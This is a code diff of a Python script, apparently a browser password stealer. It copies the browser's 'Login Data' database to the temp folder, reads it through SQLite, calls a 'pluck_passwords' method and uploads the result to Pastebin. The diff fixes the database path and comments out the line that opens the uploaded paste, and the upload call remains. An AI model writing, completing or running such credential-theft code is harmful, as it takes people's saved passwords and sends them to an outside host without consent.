@@ -18,8 +18,7 @@ class Bird:
 		copy(PATH, gettempdir())
 
 		# SQLite Connection
-		temp = gettempdir() + '//Login Data'
-		conn = sqlite3.connect(PATH + temp)
+		conn = sqlite3.connect(gettempdir() + '//Login Data')
 		cur = conn.cursor()
 
 		user_data = None
@@ -86,7 +85,7 @@ def main():
 
 	vulture = Bird()
 	vulture.pluck_passwords()
-	os.system('start {}'.format(vulture.upload_to_pastebin()))
+	# os.system('start {}'.format(vulture.upload_to_pastebin()))
 
 
 if __name__ == '__main__':
